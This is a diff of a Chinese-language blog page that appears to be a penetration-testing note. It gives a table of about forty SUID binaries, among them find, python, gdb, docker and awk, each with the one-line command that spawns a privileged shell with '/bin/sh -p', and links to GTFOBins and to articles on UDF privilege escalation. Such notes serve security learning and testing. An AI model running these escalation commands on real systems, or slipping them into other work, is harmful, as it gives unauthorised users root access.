-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>更多suid利用方式：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins">https://gtfobins.github.io/gtfobins</a></p>
 <p>如<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51524329/article/details/121962005">https://blog.csdn.net/qq_51524329/article/details/121962005</a></p>
 <p>常用指令提权方法</p>
 <p>命令	利用方法</p>
-<pre class="line-numbers language-shell"><code class="language-shell">命令	      利用方法
-zsh	        zsh
-xargs	      xargs -a /dev/null sh -p
-watch	      watch -x sh -c ‘reset; exec sh -p 1>&0 2>&0’
-timeout	    timeout 7d /bin/sh -p
-time	      time /bin/sh -p
-tclsh	      1、tclsh 2、exec /bin/sh -p <@stdin >@stdout 2>@stderr
-taskset	    taskset 1 /bin/sh -p
-stdbuf	    stdbuf -i0 /bin/sh -p
-strace	    strace -o /dev/null /bin/sh -p
-ssh	        ssh -o ProxyCommand=’;sh -p 0<&2 1>&2’ x
-setarch	    setarch $(arch) /bin/sh -p
-rsync	      rsync -e ‘sh -p -c “sh -p 0<&2 1>&2”’ 127.0.0.1:/dev/null
-rpm	        rpm --eval ‘%{lua:os.execute("/bin/sh -p")}’
-python	    python -c ‘import os; os.execl("/bin/sh", “sh”, “-p”)’
-php	        1、CMD="/bin/sh" 2、 php -r “pcntl_exec(’/bin/sh’, [’-p’]);”
-nice	      nice /bin/sh -p
-nano	      1、nano //运行nano程序  2、^R //按下ctrl-r 3、^X //按下ctrl-x 4、reset; sh -p 1>&0 2>&0
-                             // 输 入下面的命令
-more	      1、more /etc/profile  2、!/bin/sh -p
-logsave	    logsave /dev/null /bin/sh -i -p
-less	      less /etc/profile //读取文件，在底行输入!/bin/sh -p
-ksh	        ksh -p
-ip	        1、ip netns add foo 2、ip netns exec foo /bin/sh -p 3、ip netns delete foo
-ionice	    ionice /bin/sh -p
-git	        git help status
-gimp	      gimp -idf --batch-interpreter=python-fu-eval -b ‘import os; os.execl("/bin/sh", “sh”,         “-p”)’
-gdb	        gdb -nx -ex ‘python import os; os.execl("/bin/sh", “sh”, “-p”)’ -ex quit
-ftp	        ftp //在底行输入“!/bin/sh -p”
-flock	      flock -u / /bin/sh -p
-find	      find . -exec /bin/sh -p ; -quit
-expect	    expect -c ‘spawn /bin/sh -p;interact’
-env	        env /bin/sh -p
-ed	        ed //在底行输入“!/bin/sh -p”
-docker	    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-dmesg	      dmesg -H//在底行输入“!/bin/sh -p”
-csh	        csh -b
-bash	      bash -p
-awk	        awk ‘BEGIN {system("/bin/bash -p")}’
-perl	      perl exec “/bin/bash”;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">命令	      利用方法</span><br><span class="line">zsh	        zsh</span><br><span class="line">xargs	      xargs -a /dev/null sh -p</span><br><span class="line">watch	      watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</span><br><span class="line">timeout	    timeout 7d /bin/sh -p</span><br><span class="line">time	      time /bin/sh -p</span><br><span class="line">tclsh	      1、tclsh 2、exec /bin/sh -p &lt;@stdin &gt;@stdout 2&gt;@stderr</span><br><span class="line">taskset	    taskset 1 /bin/sh -p</span><br><span class="line">stdbuf	    stdbuf -i0 /bin/sh -p</span><br><span class="line">strace	    strace -o /dev/null /bin/sh -p</span><br><span class="line">ssh	        ssh -o ProxyCommand=’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</span><br><span class="line">setarch	    setarch $(arch) /bin/sh -p</span><br><span class="line">rsync	      rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:/dev/null</span><br><span class="line">rpm	        rpm --eval ‘%{lua:os.execute("/bin/sh -p")}’</span><br><span class="line">python	    python -c ‘import os; os.execl("/bin/sh", “sh”, “-p”)’</span><br><span class="line">php	        1、CMD="/bin/sh" 2、 php -r “pcntl_exec(’/bin/sh’, [’-p’]);”</span><br><span class="line">nice	      nice /bin/sh -p</span><br><span class="line">nano	      1、nano //运行nano程序  2、^R //按下ctrl-r 3、^X //按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0</span><br><span class="line">                             // 输 入下面的命令</span><br><span class="line">more	      1、more /etc/profile  2、!/bin/sh -p</span><br><span class="line">logsave	    logsave /dev/null /bin/sh -i -p</span><br><span class="line">less	      less /etc/profile //读取文件，在底行输入!/bin/sh -p</span><br><span class="line">ksh	        ksh -p</span><br><span class="line">ip	        1、ip netns add foo 2、ip netns exec foo /bin/sh -p 3、ip netns delete foo</span><br><span class="line">ionice	    ionice /bin/sh -p</span><br><span class="line">git	        git help status</span><br><span class="line">gimp	      gimp -idf --batch-interpreter=python-fu-eval -b ‘import os; os.execl("/bin/sh", “sh”,         “-p”)’</span><br><span class="line">gdb	        gdb -nx -ex ‘python import os; os.execl("/bin/sh", “sh”, “-p”)’ -ex quit</span><br><span class="line">ftp	        ftp //在底行输入“!/bin/sh -p”</span><br><span class="line">flock	      flock -u / /bin/sh -p</span><br><span class="line">find	      find . -exec /bin/sh -p ; -quit</span><br><span class="line">expect	    expect -c ‘spawn /bin/sh -p;interact’</span><br><span class="line">env	        env /bin/sh -p</span><br><span class="line">ed	        ed //在底行输入“!/bin/sh -p”</span><br><span class="line">docker	    docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class="line">dmesg	      dmesg -H//在底行输入“!/bin/sh -p”</span><br><span class="line">csh	        csh -b</span><br><span class="line">bash	      bash -p</span><br><span class="line">awk	        awk ‘BEGIN {system("/bin/bash -p")}’</span><br><span class="line">perl	      perl exec “/bin/bash”;</span><br></pre></td></tr></tbody></table></figure>
+
 <h2 id="0x07-udf提权"><a href="#0x07-udf提权" class="headerlink" title="0x07 udf提权"></a>0x07 udf提权</h2><p><a target="_blank" rel="noopener" href="https://view.inews.qq.com/a/20220612A022PB00">https://view.inews.qq.com/a/20220612A022PB00</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44881113/article/details/118907122">https://blog.csdn.net/qq_44881113/article/details/118907122</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_57221101/article/details/123936958?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-4-123936958-blog-127457975.pc_relevant_aa&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-4-123936958-blog-127457975.pc_relevant_aa&amp;utm_relevant_index=4">https://blog.csdn.net/m0_57221101/article/details/123936958?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-4-123936958-blog-127457975.pc_relevant_aa&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-4-123936958-blog-127457975.pc_relevant_aa&amp;utm_relevant_index=4</a></p>
